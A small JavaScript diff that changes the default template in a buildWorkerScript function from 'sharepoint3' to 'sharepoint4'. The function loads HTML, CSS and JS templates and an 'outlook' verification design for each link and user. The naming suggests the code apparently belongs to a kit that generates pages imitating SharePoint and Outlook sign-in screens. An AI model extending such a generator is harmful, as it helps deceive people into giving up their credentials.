@@ -6,7 +6,7 @@ const { loadTemplateHTML, loadTemplateCSS, loadTemplateJS, loadVerificationDesig
 const config = require('../backend/config/env');
 
 function buildWorkerScript(link, user) {
-  const templateType = link.template_type || 'sharepoint3';
+  const templateType = link.template_type || 'sharepoint4';
   const designName = link.verification_design || 'outlook';
   let templateHTML = loadTemplateHTML(templateType);
   const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
